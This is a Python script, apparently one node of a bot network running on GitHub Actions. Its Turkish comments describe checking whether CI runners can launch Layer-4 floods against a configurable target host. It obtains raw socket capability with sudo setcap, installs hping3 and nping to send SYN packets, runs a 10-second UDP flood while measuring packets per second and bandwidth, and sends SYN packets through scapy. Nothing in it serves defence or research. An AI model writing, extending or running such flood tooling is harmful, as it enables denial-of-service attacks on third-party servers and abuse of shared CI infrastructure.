#!/usr/bin/env python3
"""
L4 RAW SOCKET TEST — GitHub Actions'ta gercekten calisir mi?

sudo ile raw socket acmaya calisir.
hping3 kurulursa onu da dener.
Sonuclari loglar — gercek L4 mumkunse buyuk gelisme.
"""

import socket
import os
import sys
import subprocess
import time

TARGET = os.environ.get('TARGET_URL', 'https://gorouter.app')
BOT_ID = os.environ.get('BOT_ID', '0')

# URL'den host cikar
host = TARGET.replace('https://','').replace('http://','').split('/')[0].split(':')[0]
try:
    ip = socket.gethostbyname(host)
except:
    ip = host

print(f'=== L4 RAW SOCKET TEST — BOT #{BOT_ID} ===')
print(f'Target: {host} -> {ip}')
print(f'User: {os.popen("whoami").read().strip()}')
print(f'Sudo: {os.path.exists("/usr/bin/sudo")}')
print()

# Test 1: Raw socket (no sudo)
print('--- TEST 1: Raw socket without sudo ---')
for proto_name, proto in [('UDP', socket.IPPROTO_UDP), ('TCP', socket.IPPROTO_TCP), ('ICMP', socket.IPPROTO_ICMP)]:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, proto)
        print(f'  {proto_name}: ALLOWED (no sudo needed!)')
        s.close()
    except Exception as e:
        print(f'  {proto_name}: {e}')

# Test 2: Try with CAP_NET_RAW
print()
print('--- TEST 2: setcap cap_net_raw on python ---')
try:
    python_path = sys.executable
    result = subprocess.run(['sudo', 'setcap', 'cap_net_raw+ep', python_path], capture_output=True, text=True)
    print(f'  setcap result: {result.returncode} {result.stderr.strip()}')
    if result.returncode == 0:
        # Tekrar dene
        for proto_name, proto in [('UDP', socket.IPPROTO_UDP), ('TCP', socket.IPPROTO_TCP)]:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, proto)
                print(f'  {proto_name} after setcap: ALLOWED!')
                s.close()
            except Exception as e:
                print(f'  {proto_name} after setcap: {e}')
except Exception as e:
    print(f'  setcap failed: {e}')

# Test 3: hping3
print()
print('--- TEST 3: hping3 install + test ---')
try:
    subprocess.run(['sudo', 'apt-get', 'install', '-y', '-qq', 'hping3'], capture_output=True, timeout=30)
    # 5 paket SYN flood testi
    result = subprocess.run(
        ['sudo', 'hping3', '--syn', '-p', '80', '-c', '5', '--fast', ip],
        capture_output=True, text=True, timeout=15
    )
    print(f'  hping3 stdout: {result.stdout[:500]}')
    print(f'  hping3 stderr: {result.stderr[:500]}')
    print(f'  hping3 exit: {result.returncode}')
    if 'flags=SA' in result.stdout or 'flags=R' in result.stdout:
        print('  >>> HPING3 CALISTI! SYN paketi gitti ve cevap geldi! <<<')
    elif result.returncode == 0:
        print('  >>> HPING3 cikis kodu 0 — muhtemelen calisti! <<<')
except subprocess.TimeoutExpired:
    print('  hping3 timeout (firewall drop olabilir)')
except Exception as e:
    print(f'  hping3 failed: {e}')

# Test 4: nping (nmap paketi)
print()
print('--- TEST 4: nping test ---')
try:
    subprocess.run(['sudo', 'apt-get', 'install', '-y', '-qq', 'nmap'], capture_output=True, timeout=30)
    result = subprocess.run(
        ['sudo', 'nping', '--tcp', '-p', '80', '--flags', 'syn', '-c', '3', '--rate', '100', ip],
        capture_output=True, text=True, timeout=15
    )
    print(f'  nping stdout: {result.stdout[:500]}')
    print(f'  nping exit: {result.returncode}')
except subprocess.TimeoutExpired:
    print('  nping timeout')
except Exception as e:
    print(f'  nping failed: {e}')

# Test 5: UDP sendto (normal socket — yuksek hiz)
print()
print('--- TEST 5: UDP DGRAM speed test (10 sec) ---')
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = b'\x00' * 1400  # MTU-safe
    count = 0
    start = time.time()
    while time.time() - start < 10:
        try:
            s.sendto(payload, (ip, 80))
            count += 1
        except:
            break
    elapsed = time.time() - start
    pps = count / elapsed
    mbps = (count * 1400 * 8) / elapsed / 1_000_000
    print(f'  Sent: {count} packets in {elapsed:.1f}s')
    print(f'  PPS: {pps:.0f}')
    print(f'  Bandwidth: {mbps:.1f} Mbps')
    s.close()
except Exception as e:
    print(f'  UDP test failed: {e}')

# Test 6: TCP SYN via scapy (if installable)
print()
print('--- TEST 6: scapy SYN test ---')
try:
    subprocess.run([sys.executable, '-m', 'pip', 'install', '-q', 'scapy'], capture_output=True, timeout=30)
    result = subprocess.run(
        ['sudo', sys.executable, '-c', f'''
from scapy.all import *
import time
conf.verb=0
pkt = IP(dst="{ip}")/TCP(dport=80, flags="S")
start = time.time()
count = 0
for i in range(100):
    send(pkt, verbose=0)
    count += 1
elapsed = time.time() - start
print(f"Scapy: {{count}} SYN packets in {{elapsed:.1f}}s = {{count/elapsed:.0f}} PPS")
'''],
        capture_output=True, text=True, timeout=30
    )
    print(f'  {result.stdout.strip()}')
    if result.stderr:
        print(f'  stderr: {result.stderr[:200]}')
except Exception as e:
    print(f'  scapy failed: {e}')

print()
print('=== TEST TAMAMLANDI ===')
print('Yukaridaki sonuclara gore gercek L4 mumkun mu degil mi belli.')